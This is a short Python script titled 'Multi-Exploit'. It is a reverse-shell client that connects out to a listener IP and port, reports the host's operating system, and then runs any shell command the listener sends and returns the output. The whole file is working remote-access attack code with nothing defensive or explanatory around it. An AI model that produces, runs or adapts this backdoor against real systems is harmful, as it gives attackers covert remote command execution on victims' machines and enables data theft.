#    Multi-Exploit  Copyright (C) 2024  Adam Perkowski

import socket
from subprocess import Popen, PIPE
from sys import argv
from os import name as osname
from platform import platform as ospltfrm
from time import sleep

def conn():
    print('connecting...')
    g = False
    while not g:
        try:
            sockObject.connect((listenerIP, port))
            g = True
        except:
            g = False
    print('\nconnected >:)\nping: ')
    print('sending os info...')
    sleep(2)
    sockObject.send(osname.encode())
    sleep(2)
    sockObject.send(ospltfrm().encode())
    sleep(2)
    print('sent. idling.\n')

argv.pop(0)
print(argv)

sockObject = socket.socket()

if len(argv) < 2:
    listenerIP = input("IP  ? ")
    port = int(input("TCP ? "))
else:
    listenerIP = argv[0]
    port = int(argv[1])

conn()

while True:
    try:
        sockObject.send("pong".encode())
        
        sockObject.settimeout(2)
        try:
            r = sockObject.recv(1024).decode()
            if r[0] == 's' and r[1] == 'h':
                sleep(2)
                
                r2 = sockObject.recv(1024).decode()

                if 'wait' in r2:
                    try:
                        ppn = Popen(r.replace('sh', ''), stdout=PIPE)
                        sockObject.send(str(ppn.communicate()[0].decode("utf-8")).encode())
                    except FileNotFoundError:
                        ppn = 'file not found'
                    except:
                        ppn = 'Other OSError (probably no permission)'
                    sockObject.send(str(ppn).encode())
                elif 'go' in r2:
                    try:
                        Popen(r.replace('sh', ''))
                    except:
                        pass
        except TimeoutError:
            pass
        sockObject.settimeout(None)

        #sleep(2)
    except(ConnectionResetError, ConnectionAbortedError):
        print("\nconnection lost.\nresetting...\n")
        sockObject = socket.socket()
        conn()

    #r = sockObject.recv(1024).decode()
    #if('sh' in r): Popen(r.replace('sh', ''))
    #elif('ft' in r): print('ftp')
